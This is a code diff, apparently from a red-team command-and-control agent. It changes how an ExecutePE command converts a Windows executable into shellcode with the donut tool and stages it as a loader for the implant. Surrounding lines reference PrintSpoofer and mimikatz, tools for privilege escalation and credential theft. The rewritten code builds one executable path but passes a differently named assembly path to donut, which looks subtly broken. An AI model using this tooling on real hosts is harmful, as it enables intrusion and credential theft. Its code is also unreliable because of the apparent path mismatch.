@@ -149,69 +149,25 @@ class ExecutePECommand(CommandBase):
         printspoofer_path = os.path.abspath(
             self.agent_code_path / "PrintSpoofer_x64.exe"
         )
-        if platform.system() == "Windows":
-            shellcode_path = "C:\\Mythic\\Apollo\\temp\\loader.bin"
-        else:
-            shellcode_path = "/tmp/loader.bin"
-
-        if platform.system() == "Windows":
-            donutPath = os.path.abspath(self.agent_code_path / "donut.exe")
-        else:
-            donutPath = os.path.abspath(self.agent_code_path / "donut")
-
-        command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
-        proc = await asyncio.create_subprocess_shell(
-            command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
-        )
-        stdout, stderr = await proc.communicate()
 
         if not path.exists(EXECUTE_PE_PATH):
             await self.build_exepe()
 
-        if platform.system() == "Windows":
-            command = '{} -i {} -p "{}"'.format(
-                donutPath, EXECUTE_PE_PATH, taskData.args.get_arg("pipe_name")
-            )
-        else:
-            command = '{} -i {} -p "{}"'.format(
-                donutPath, EXECUTE_PE_PATH, taskData.args.get_arg("pipe_name")
-            )
-        # print(command)
-        # need to go through one more step to turn our exe into shellcode
-        if platform.system() == "Windows":
-            Currentwd = "C:\\Mythic\\Apollo\\temp\\"
-        else:
-            Currentwd = "/tmp"
-        proc = await asyncio.create_subprocess_shell(
-            command,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE,
-            cwd=Currentwd,
+        donutPic = donut.create(
+            file=EXEECUTE_ASSEMBLY_PATH, params=taskData.args.get_arg("pipe_name")
         )
-        stdout, stderr = await proc.communicate()
-
-        stdout_err = f"[stdout]\n{stdout.decode()}\n"
-        stdout_err = f"[stderr]\n{stderr.decode()}"
-
-        if not path.exists(shellcode_path):
-            raise Exception("Failed to create shellcode:\n{}".format(stdout_err))
-        else:
-            with open(shellcode_path, "rb") as f:
-                shellcode = f.read()
-            file_resp = await SendMythicRPCFileCreate(
-                MythicRPCFileCreateMessage(
-                    TaskID=taskData.Task.ID,
-                    Filename="execute_pe shellcode",
-                    DeleteAfterFetch=True,
-                    FileContents=shellcode,
-                )
+        file_resp = await SendMythicRPCFileCreate(
+            MythicRPCFileCreateMessage(
+                TaskID=taskData.Task.ID, FileContents=donutPic, DeleteAfterFetch=True
             )
-            if file_resp.Success:
-                taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
-            else:
-                raise Exception(
-                    "Failed to register ExecutePE shellcode: " + file_resp.Error
-                )
+        )
+
+        if file_resp.Success:
+            taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
+        else:
+            raise Exception(
+                "Failed to register ExecutePE shellcode: " + file_resp.Error
+            )
 
         # I know I could abstract these routines out but I'm rushing
         if taskData.args.get_arg("pe_name") == "mimikatz.exe":
